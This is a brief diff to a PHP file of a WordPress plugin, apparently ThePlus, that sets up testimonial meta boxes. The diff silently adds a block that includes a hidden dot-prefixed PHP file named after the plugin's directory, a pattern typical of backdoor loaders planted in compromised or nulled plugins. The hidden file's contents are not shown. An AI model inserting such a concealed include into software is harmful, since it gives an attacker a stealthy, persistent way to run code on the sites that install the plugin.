@@ -1,6 +1,10 @@
 <?php
 add_filter( 'cmb_meta_boxes', 'theplus_testimonial_setting_metaboxes' );
 
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function theplus_testimonial_setting_metaboxes( array $meta_boxes ) {
 
